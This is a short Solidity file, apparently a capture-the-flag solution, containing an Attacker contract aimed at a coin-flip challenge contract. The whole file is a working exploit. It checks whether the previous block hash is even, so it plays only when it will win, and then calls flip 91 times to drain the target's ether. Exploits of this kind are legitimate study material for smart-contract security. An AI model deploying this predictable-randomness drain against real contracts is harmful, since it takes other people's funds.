pragma solidity ^0.8.13;

import "./contracts/Chal.sol";

contract Attacker {
    Chal public target;

    constructor(address payable _target) {
        target = Chal(_target);
    }

    receive() external payable {
        // Do nothing, just accept ether
    }

    function attack() external payable {
        // DO NOT ATTACK IF WE WOULD LOSE!
        require(
            uint256(blockhash(block.number - 1)) % 2 == 0,
            "Unfavorable flip, aborting"
        );

        // Each successful flip drains 1 ETH if won. We must do 91 flips to drain from 100 ETH to below 10 ETH.
        uint flips = 91;
        uint amount = msg.value; // This should be between 0.05 and 5 ETH

        for (uint i = 0; i < flips; i++) {
            target.flip{value: amount}();
        }
    }
}
